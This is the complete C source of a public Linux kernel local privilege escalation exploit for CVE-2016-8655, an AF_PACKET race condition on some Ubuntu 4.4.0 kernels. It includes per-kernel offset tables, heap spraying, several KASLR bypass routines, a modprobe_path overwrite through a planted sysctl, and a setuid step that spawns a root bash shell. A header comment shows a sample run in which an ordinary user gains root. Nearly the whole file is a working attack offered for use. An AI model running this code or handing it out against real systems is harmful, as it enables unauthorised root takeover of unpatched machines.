/*
chocobo_root.c
linux AF_PACKET race condition exploit for CVE-2016-8655.
Includes KASLR and SMEP/SMAP bypasses.
For Ubuntu 14.04 / 16.04 (x86_64) kernels 4.4.0 before 4.4.0-53.74.
All kernel offsets have been tested on Ubuntu / Linux Mint.

vroom vroom
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=
user@ubuntu:~$ uname -a
Linux ubuntu 4.4.0-51-generic #72-Ubuntu SMP Thu Nov 24 18:29:54 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)
user@ubuntu:~$ gcc chocobo_root.c -o chocobo_root -lpthread
user@ubuntu:~$ ./chocobo_root
linux AF_PACKET race condition exploit by rebel
kernel version: 4.4.0-51-generic #72
proc_dostring = 0xffffffff81088090
modprobe_path = 0xffffffff81e48f80
register_sysctl_table = 0xffffffff812879a0
set_memory_rw = 0xffffffff8106f320
exploit starting
making vsyscall page writable..

new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 174222, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying.......
vsyscall page altered!


stage 1 completed
registering new sysctl..

new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 30773, last val = 0)
current packet version = 2
pbd->hdr.bh1.offset_to_first_pkt = 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 133577, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying.......
sysctl added!

stage 2 completed
binary executed by kernel, launching rootshell
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root),1000(user)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=

Shoutouts to:
jsc for inspiration (https://www.youtube.com/watch?v=x4UDIfcYMKI)
mcdelivery for delivering hotcakes and coffee

11/2016
by rebel
---
Updated by <bcoles@gmail.com>
- check number of CPU cores
- KASLR bypasses
- additional kernel targets
https://github.com/bcoles/kernel-exploits/tree/master/CVE-2016-8655
*/

#define _GNU_SOURCE

#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/sysinfo.h>
#include <sys/utsname.h>
#include <sys/wait.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>

#define DEBUG

#ifdef DEBUG
#  define dprintf printf
#else
#  define dprintf
#endif

#define ENABLE_KASLR_BYPASS 1

// Will be overwritten if ENABLE_KASLR_BYPASS
unsigned long KERNEL_BASE = 0xffffffff81000000ul;

// Will be overwritten by detect_versions()
int kernel = -1;

// New sysctl path
const char *SYSCTL_NAME = "hack";
const char *SYSCTL_PATH = "/proc/sys/hack";

volatile int barrier = 1;
volatile int vers_switcher_done = 0;

struct kernel_info {
    char *kernel_version;
    unsigned long proc_dostring;
    unsigned long modprobe_path;
    unsigned long register_sysctl_table;
    unsigned long set_memory_rw;
};

struct kernel_info kernels[] = {
    { "4.4.0-21-generic #37~14.04.1-Ubuntu", 0x084220, 0xc4b000, 0x273a30, 0x06b9d0 },
    { "4.4.0-22-generic #40~14.04.1-Ubuntu", 0x084250, 0xc4b080, 0x273de0, 0x06b9d0 },
    { "4.4.0-24-generic #43~14.04.1-Ubuntu", 0x084120, 0xc4b080, 0x2736f0, 0x06b880 },
    { "4.4.0-28-generic #47~14.04.1-Ubuntu", 0x084160, 0xc4b100, 0x273b70, 0x06b880 },
    { "4.4.0-31-generic #50~14.04.1-Ubuntu", 0x084160, 0xc4b100, 0x273c20, 0x06b880 },
    { "4.4.0-34-generic #53~14.04.1-Ubuntu", 0x084160, 0xc4b100, 0x273c40, 0x06b880 },
    { "4.4.0-36-generic #55~14.04.1-Ubuntu", 0x084160, 0xc4b100, 0x273c60, 0x06b890 },
    { "4.4.0-38-generic #57~14.04.1-Ubuntu", 0x084210, 0xe4b100, 0x2742e0, 0x06b890 },
    { "4.4.0-42-generic #62~14.04.1-Ubuntu", 0x084260, 0xe4b100, 0x274300, 0x06b880 },
    { "4.4.0-45-generic #66~14.04.1-Ubuntu", 0x084260, 0xe4b100, 0x274340, 0x06b880 },
    //{"4.4.0-46-generic #67~14.04.1-Ubuntu",0x0842f0,0xe4b100,0x274580,0x06b880},
    { "4.4.0-47-generic #68~14.04.1-Ubuntu", 0x0842f0, 0xe4b100, 0x274580, 0x06b880 },
    //{"4.4.0-49-generic #70~14.04.1-Ubuntu",0x084350,0xe4b100,0x274b10,0x06b880},
    { "4.4.0-51-generic #72~14.04.1-Ubuntu", 0x084350, 0xe4b100, 0x274750, 0x06b880 },

    { "4.4.0-21-generic #37-Ubuntu", 0x087cf0, 0xe48e80, 0x286310, 0x06f370 },
    { "4.4.0-22-generic #40-Ubuntu", 0x087d40, 0xe48f00, 0x2864d0, 0x06f370 },
    { "4.4.0-24-generic #43-Ubuntu", 0x087e60, 0xe48f00, 0x2868f0, 0x06f370 },
    { "4.4.0-28-generic #47-Ubuntu", 0x087ea0, 0xe48f80, 0x286df0, 0x06f370 },
    { "4.4.0-31-generic #50-Ubuntu", 0x087ea0, 0xe48f80, 0x286e90, 0x06f370 },
    { "4.4.0-34-generic #53-Ubuntu", 0x087ea0, 0xe48f80, 0x286ed0, 0x06f370 },
    { "4.4.0-36-generic #55-Ubuntu", 0x087ea0, 0xe48f80, 0x286e50, 0x06f360 },
    { "4.4.0-38-generic #57-Ubuntu", 0x087f70, 0xe48f80, 0x287470, 0x06f360 },
    { "4.4.0-42-generic #62-Ubuntu", 0x087fc0, 0xe48f80, 0x2874a0, 0x06f320 },
    { "4.4.0-43-generic #63-Ubuntu", 0x087fc0, 0xe48f80, 0x2874b0, 0x06f320 },
    { "4.4.0-45-generic #66-Ubuntu", 0x087fc0, 0xe48f80, 0x2874c0, 0x06f320 },
    //{"4.4.0-46-generic #67-Ubuntu",0x088040,0xe48f80,0x287800,0x06f320},
    { "4.4.0-47-generic #68-Ubuntu", 0x088040, 0xe48f80, 0x287800, 0x06f320 },
    //{"4.4.0-49-generic #70-Ubuntu",0x088090,0xe48f80,0x287d40,0x06f320},
    { "4.4.0-51-generic #72-Ubuntu", 0x088090, 0xe48f80, 0x2879a0, 0x06f320},
};

#define VSYSCALL              0xffffffffff600000
#define PROC_DOSTRING         (KERNEL_BASE + kernels[kernel].proc_dostring)
#define MODPROBE_PATH         (KERNEL_BASE + kernels[kernel].modprobe_path)
#define REGISTER_SYSCTL_TABLE (KERNEL_BASE + kernels[kernel].register_sysctl_table)
#define SET_MEMORY_RW         (KERNEL_BASE + kernels[kernel].set_memory_rw)

#define KMALLOC_PAD 64

int pad_fds[KMALLOC_PAD];

// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *

struct ctl_table {
    const char *procname;
    void *data;
    int maxlen;
    unsigned short mode;
    struct ctl_table *child;
    void *proc_handler;
    void *poll;
    void *extra1;
    void *extra2;
};

#define CONF_RING_FRAMES 1

struct tpacket_req3 tp;
int sfd;
int mapped = 0;

struct timer_list {
    void *next;
    void *prev;
    unsigned long           expires;
    void                    (*function)(unsigned long);
    unsigned long           data;
    unsigned int            flags;
    int                     slack;
};

// * * * * * * * * * * * * * * * Helpers * * * * * * * * * * * * * * * * * *

void *setsockopt_thread(void *arg)
{
    while (barrier) {}
    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &tp, sizeof(tp));

    return NULL;
}

void *vers_switcher(void *arg)
{
    int val,x,y;

    while (barrier) {}

    while (1) {
        val = TPACKET_V1;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        y++;

        if (x != 0) break;

        val = TPACKET_V3;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        if (x != 0) break;

        y++;
    }

    dprintf("[.] version switcher stopping, x = %d (y = %d, last val = %d)\n",x,y,val);
    vers_switcher_done = 1;

    return NULL;
}

// * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *

#define BUFSIZE 1408
char exploitbuf[BUFSIZE];

void kmalloc(void)
{
    while(1)
        syscall(__NR_add_key, "user", "wtf", exploitbuf, BUFSIZE - 24, -2);
}

void pad_kmalloc(void)
{
    int x;
    for (x = 0; x < KMALLOC_PAD; x++)
        if (socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP)) == -1) {
            dprintf("[-] pad_kmalloc() socket error\n");
            exit(EXIT_FAILURE);
        }
}

// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *

int try_exploit(unsigned long func, unsigned long arg, void *verification_func)
{
    pthread_t setsockopt_thread_thread,a;
    int val;
    socklen_t l;
    struct timer_list *timer;
    int fd;
    struct tpacket_block_desc *pbd;
    int off;
    sigset_t set;

    sigemptyset(&set);

    sigaddset(&set, SIGSEGV);

    if (pthread_sigmask(SIG_BLOCK, &set, NULL) != 0) {
        dprintf("[-] couldn't set sigmask\n");
        exit(1);
    }

    dprintf("[.] new exploit attempt starting, jumping to %p, arg=%p\n", (void *)func, (void *)arg);

    pad_kmalloc();

    fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));

    if (fd == -1) {
        dprintf("[-] target socket error\n");
        exit(1);
    }

    pad_kmalloc();

    dprintf("[.] done, sockets allocated\n");

    val = TPACKET_V3;

    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
    tp.tp_block_nr = 1;
    tp.tp_frame_size = getpagesize();
    tp.tp_frame_nr = CONF_RING_FRAMES;

    // try to set the timeout to 10 seconds
    // the default timeout might still be used though depending on when the race was won
    tp.tp_retire_blk_tov = 10000;

    sfd = fd;

    if (pthread_create(&setsockopt_thread_thread, NULL, setsockopt_thread, (void *)NULL)) {
        dprintf("[-] Error creating thread\n");
        return 1;
    }

    pthread_create(&a, NULL, vers_switcher, (void *)NULL);

    usleep(200000);

    dprintf("[.] removing barrier and spraying...\n");

    memset(exploitbuf, '\x00', BUFSIZE);

    timer = (struct timer_list *)(exploitbuf+(0x6c*8)+6-8);
    timer->next = 0;
    timer->prev = 0;

    timer->expires = 4294943360;
    timer->function = (void *)func;
    timer->data = arg;
    timer->flags = 1;
    timer->slack = -1;

    barrier = 0;

    usleep(100000);

    while (!vers_switcher_done) usleep(100000);

    l = sizeof(val);
    getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, &l);

    dprintf("[.] current packet version = %d\n",val);

    pbd = mmap(0, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0);

    if (pbd == MAP_FAILED) {
        dprintf("[-] could not map pbd\n");
        exit(1);
    } else {
        off = pbd->hdr.bh1.offset_to_first_pkt;
        dprintf("[.] pbd->hdr.bh1.offset_to_first_pkt = %d\n", off);
    }


    if (val == TPACKET_V1 && off != 0) {
        dprintf("*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*\n");
    } else {
        dprintf("[-] race not won\n");
        exit(2);
    }

    munmap(pbd, tp.tp_block_size * tp.tp_block_nr);

    pthread_create(&a, NULL, verification_func, (void *)NULL);

    dprintf("\n");
    dprintf("[!] please wait up to a few minutes for timer to be executed.\n");
    dprintf("[!] if you ctrl-c now the kernel will hang. so don't do that.\n");
    dprintf("\n");

    sleep(1);
    dprintf("[.] closing socket and verifying...\n");

    close(sfd);

    kmalloc();

    dprintf("[.] all messages sent\n");

    sleep(31337);
    exit(1);
}

int verification_result = 0;

void catch_sigsegv(int sig)
{
    verification_result = 0;
    pthread_exit((void *)1);
}

void *modify_vsyscall(void *arg)
{
    unsigned long *vsyscall = (unsigned long *)(VSYSCALL+0x850);
    unsigned long x = (unsigned long)arg;

    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGSEGV);

    if (pthread_sigmask(SIG_UNBLOCK, &set, NULL) != 0) {
        dprintf("[-] couldn't set sigmask\n");
        exit(EXIT_FAILURE);
    }

    signal(SIGSEGV, catch_sigsegv);

    *vsyscall = 0xdeadbeef+x;

    if (*vsyscall == 0xdeadbeef+x) {
        dprintf("[~] vsyscall page altered!\n");
        verification_result = 1;
        pthread_exit(0);
    }

    return NULL;
}

void verify_stage1(void)
{
    pthread_t v_thread;

    sleep(5);

    int x;
    for(x = 0; x < 300; x++) {

        pthread_create(&v_thread, NULL, modify_vsyscall, 0);

        pthread_join(v_thread, NULL);

        if(verification_result == 1) {
            exit(0);
        }

        write(2,".",1);
        sleep(1);
    }

    dprintf("[-] could not modify vsyscall\n");
    exit(EXIT_FAILURE);
}

void verify_stage2(void)
{
    struct stat b;

    sleep(5);

    int x;
    for(x = 0; x < 300; x++) {

        if (stat(SYSCTL_PATH, &b) == 0) {
            dprintf("[~] sysctl added!\n");
            exit(0);
        }

        write(2,".",1);
        sleep(1);
    }

    dprintf("[-] could not add sysctl\n");
    exit(EXIT_FAILURE);
}

void exploit(unsigned long func, unsigned long arg, void *verification_func)
{
    int status;
    int pid;

retry:

    pid = fork();

    if (pid == 0) {
        try_exploit(func, arg, verification_func);
        exit(1);
    }

    wait(&status);

    dprintf("\n");

    if (WEXITSTATUS(status) == 2) {
        dprintf("[.] retrying stage...\n");
        kill(pid, 9);
        sleep(2);
        goto retry;
    }

    if (WEXITSTATUS(status) != 0) {
        dprintf("[-] something bad happened, aborting exploit attempt\n");
        exit(EXIT_FAILURE);
    }

    kill(pid, 9);
}


void wrapper(void)
{
    struct ctl_table *c;

    dprintf("[.] making vsyscall page writable...\n\n");

    exploit(SET_MEMORY_RW, VSYSCALL, verify_stage1);

    dprintf("[~] done, stage 1 completed\n");

    sleep(5);

    dprintf("[.] registering new sysctl...\n\n");

    c = (struct ctl_table *)(VSYSCALL+0x850);

    memset((char *)(VSYSCALL+0x850), '\x00', 1952);

    strcpy((char *)(VSYSCALL+0xf00), SYSCTL_NAME);
    memcpy((char *)(VSYSCALL+0xe00), "\x01\x00\x00\x00",4);
    c->procname = (char *)(VSYSCALL+0xf00);
    c->mode = 0666;
    c->proc_handler = (void *)(PROC_DOSTRING);
    c->data = (void *)(MODPROBE_PATH);
    c->maxlen = 256;
    c->extra1 = (void *)(VSYSCALL+0xe00);
    c->extra2 = (void *)(VSYSCALL+0xd00);

    exploit(REGISTER_SYSCTL_TABLE, VSYSCALL+0x850, verify_stage2);

    dprintf("[~] done, stage 2 completed\n");
}

// * * * * * * * * * * * * * * * * * Detect * * * * * * * * * * * * * * * * *

void check_procs() {
    int min_procs = 2;

    int nprocs = 0;
    nprocs = get_nprocs_conf();

    if (nprocs < min_procs) {
        dprintf("[-] system has less than %d processor cores\n", min_procs);
        exit(EXIT_FAILURE);
    }

    dprintf("[.] system has %d processor cores\n", nprocs);
}

struct utsname get_kernel_version() {
    struct utsname u;
    int rv = uname(&u);
    if (rv != 0) {
        dprintf("[-] uname())\n");
        exit(EXIT_FAILURE);
    }
    return u;
}

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

void detect_versions() {
    struct utsname u;
    char kernel_version[512];

    u = get_kernel_version();

    if (strstr(u.machine, "64") == NULL) {
        dprintf("[-] system is not using a 64-bit kernel\n");
        exit(EXIT_FAILURE);
    }

    if (strstr(u.version, "-Ubuntu") == NULL) {
        dprintf("[-] system is not using an Ubuntu kernel\n");
        exit(EXIT_FAILURE);
    }

    char *u_ver = strtok(u.version, " ");
    snprintf(kernel_version, 512, "%s %s", u.release, u_ver);

    int i;
    for (i = 0; i < ARRAY_SIZE(kernels); i++) {
        if (strcmp(kernel_version, kernels[i].kernel_version) == 0) {
            dprintf("[.] kernel version '%s' detected\n", kernels[i].kernel_version);
            kernel = i;
            return;
        }
    }

    dprintf("[-] kernel version not recognized\n");
    exit(EXIT_FAILURE);
}

// * * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

bool mmap_syslog(char** buffer, int* size) {
    *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);
    if (*size == -1) {
        dprintf("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER)\n");
        return false;
    }

    *size = (*size / getpagesize() + 1) * getpagesize();
    *buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);
    if (*size == -1) {
        dprintf("[-] klogctl(SYSLOG_ACTION_READ_ALL)\n");
        return false;
    }

    return true;
}

unsigned long get_kernel_addr_trusty(char* buffer, int size) {
    const char* needle1 = "Freeing unused";
    char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));
    if (substr == NULL) return 0;

    int start = 0;
    int end = 0;
    for (end = start; substr[end] != '-'; end++);

    const char* needle2 = "ffffff";
    substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
    if (substr == NULL) return 0;

    char* endptr = &substr[16];
    unsigned long r = strtoul(&substr[0], &endptr, 16);

    r &= 0xffffffffff000000ul;

    return r;
}

unsigned long get_kernel_addr_xenial(char* buffer, int size) {
    const char* needle1 = "Freeing unused";
    char* substr = (char*)memmem(&buffer[0], size, needle1, strlen(needle1));
    if (substr == NULL) {
        return 0;
    }

    int start = 0;
    int end = 0;
    for (start = 0; substr[start] != '-'; start++);
    for (end = start; substr[end] != '\n'; end++);

    const char* needle2 = "ffffff";
    substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));
    if (substr == NULL) {
        return 0;
    }

    char* endptr = &substr[16];
    unsigned long r = strtoul(&substr[0], &endptr, 16);

    r &= 0xfffffffffff00000ul;
    r -= 0x1000000ul;

    return r;
}

unsigned long get_kernel_addr_syslog() {
    unsigned long addr = 0;
    char* syslog;
    int size;

    dprintf("[.] trying syslog...\n");

    if (!mmap_syslog(&syslog, &size))
        return 0;

    if (strstr(kernels[kernel].kernel_version, "14.04.1") != NULL)
        addr = get_kernel_addr_trusty(syslog, size);
    else
        addr = get_kernel_addr_xenial(syslog, size);

    if (!addr)
        dprintf("[-] kernel base not found in syslog\n");

    return addr;
}

// * * * * * * * * * * * * * * kallsyms KASLR bypass * * * * * * * * * * * * * *

unsigned long get_kernel_addr_kallsyms() {
    FILE *f;
    unsigned long addr = 0;
    char dummy;
    char sname[256];
    char* name = "startup_64";
    char* path = "/proc/kallsyms";

    dprintf("[.] trying %s...\n", path);
    f = fopen(path, "r");
    if (f == NULL) {
        dprintf("[-] open/read(%s)\n", path);
        return 0;
    }

    int ret = 0;
    while (ret != EOF) {
        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
        if (ret == 0) {
            fscanf(f, "%s\n", sname);
            continue;
        }
        if (!strcmp(name, sname)) {
            fclose(f);
            return addr;
        }
    }

    fclose(f);
    dprintf("[-] kernel base not found in %s\n", path);
    return 0;
}

// * * * * * * * * * * * * * * System.map KASLR bypass * * * * * * * * * * * * * *

unsigned long get_kernel_addr_sysmap() {
    FILE *f;
    unsigned long addr = 0;
    char path[512] = "/boot/System.map-";
    char version[32];

    struct utsname u;
    u = get_kernel_version();
    strcat(path, u.release);
    dprintf("[.] trying %s...\n", path);
    f = fopen(path, "r");
    if (f == NULL) {
        dprintf("[-] open/read(%s)\n", path);
        return 0;
    }

    char dummy;
    char sname[256];
    char* name = "startup_64";
    int ret = 0;
    while (ret != EOF) {
        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
        if (ret == 0) {
            fscanf(f, "%s\n", sname);
            continue;
        }
        if (!strcmp(name, sname)) {
            fclose(f);
            return addr;
        }
    }

    fclose(f);
    dprintf("[-] kernel base not found in %s\n", path);
    return 0;
}

// * * * * * * * * * * * * * * mincore KASLR bypass * * * * * * * * * * * * * *

unsigned long get_kernel_addr_mincore() {
    unsigned char buf[getpagesize()/sizeof(unsigned char)];
    unsigned long iterations = 20000000;
    unsigned long addr = 0;

    dprintf("[.] trying mincore info leak...\n");
    /* A MAP_ANONYMOUS | MAP_HUGETLB mapping */
    if (mmap((void*)0x66000000, 0x20000000000, PROT_NONE,
        MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1, 0) == MAP_FAILED) {
        dprintf("[-] mmap()\n");
        return 0;
    }

    int i;
    for (i = 0; i <= iterations; i++) {
        /* Touch a mishandle with this type mapping */
        if (mincore((void*)0x86000000, 0x1000000, buf)) {
            dprintf("[-] mincore()\n");
            return 0;
        }

        int n;
        for (n = 0; n < getpagesize()/sizeof(unsigned char); n++) {
            addr = *(unsigned long*)(&buf[n]);
            /* Kernel address space */
            if (addr > 0xffffffff00000000) {
                addr &= 0xffffffffff000000ul;
                if (munmap((void*)0x66000000, 0x20000000000))
                    dprintf("[-] munmap()\n");
                return addr;
            }
        }
    }

    if (munmap((void*)0x66000000, 0x20000000000))
        dprintf("[-] munmap()\n");

    dprintf("[-] kernel base not found in mincore info leak\n");
    return 0;
}

// * * * * * * * * * * * * * * KASLR bypasses * * * * * * * * * * * * * * * *

unsigned long get_kernel_addr() {
    unsigned long addr = 0;

    addr = get_kernel_addr_kallsyms();
    if (addr) return addr;

    addr = get_kernel_addr_sysmap();
    if (addr) return addr;

    addr = get_kernel_addr_syslog();
    if (addr) return addr;

    addr = get_kernel_addr_mincore();
    if (addr) return addr;

    dprintf("[-] KASLR bypass failed\n");
    exit(EXIT_FAILURE);

    return 0;
}

// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *

void launch_rootshell(void)
{
    int fd;
    char buf[256];
    struct stat s;

    fd = open(SYSCTL_PATH, O_WRONLY);

    if(fd == -1) {
        dprintf("[-] could not open %s\n", SYSCTL_PATH);
        exit(EXIT_FAILURE);
    }

    memset(buf, '\x00', 256);

    readlink("/proc/self/exe", (char *)&buf, 256);

    write(fd, buf, strlen(buf)+1);

    socket(AF_INET, SOCK_STREAM, 132);

    if (stat(buf,&s) == 0 && s.st_uid == 0) {
        dprintf("[+] binary executed by kernel, launching rootshell\n");
        lseek(fd, 0, SEEK_SET);
        write(fd, "/sbin/modprobe", 15);
        close(fd);
        execl(buf, buf, NULL);
    } else {
        dprintf("[-] could not create rootshell\n");
        exit(EXIT_FAILURE);
    }
}

void setup_sandbox() {
    if (unshare(CLONE_NEWUSER) != 0) {
        dprintf("[-] unshare(CLONE_NEWUSER)\n");
        exit(EXIT_FAILURE);
    }

    if (unshare(CLONE_NEWNET) != 0) {
        dprintf("[-] unshare(CLONE_NEWNET)\n");
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char **argv)
{
    int status, pid;
    struct utsname u;
    char buf[512], *f;

    if (getuid() == 0 && geteuid() == 0) {
        chown("/proc/self/exe", 0, 0);
        chmod("/proc/self/exe", 06755);
        exit(0);
    }

    if (getuid() != 0 && geteuid() == 0) {
        setresuid(0, 0, 0);
        setresgid(0, 0, 0);
        execl("/bin/bash", "bash", "-p", NULL);
        exit(0);
    }

    dprintf("linux AF_PACKET race condition exploit by rebel\n");

    dprintf("[.] starting\n");

    dprintf("[.] checking hardware\n");
    check_procs();
    dprintf("[~] done, hardware looks good\n");

    dprintf("[.] checking kernel version\n");
    detect_versions();
    dprintf("[~] done, version looks good\n");

#if ENABLE_KASLR_BYPASS
    dprintf("[.] KASLR bypass enabled, getting kernel base address\n");
    KERNEL_BASE = get_kernel_addr();
    dprintf("[~] done, kernel text:     %lx\n", KERNEL_BASE);
#endif

    dprintf("[.] proc_dostring:         %lx\n", PROC_DOSTRING);
    dprintf("[.] modprobe_path:         %lx\n", MODPROBE_PATH);
    dprintf("[.] register_sysctl_table: %lx\n", REGISTER_SYSCTL_TABLE);
    dprintf("[.] set_memory_rw:         %lx\n", SET_MEMORY_RW);

    pid = fork();
    if (pid == 0) {
        dprintf("[.] setting up namespace sandbox\n");
        setup_sandbox();
        dprintf("[~] done, namespace sandbox set up\n");
        wrapper();
        exit(0);
    }

    waitpid(pid, &status, 0);

    launch_rootshell();
    return 0;
}
            
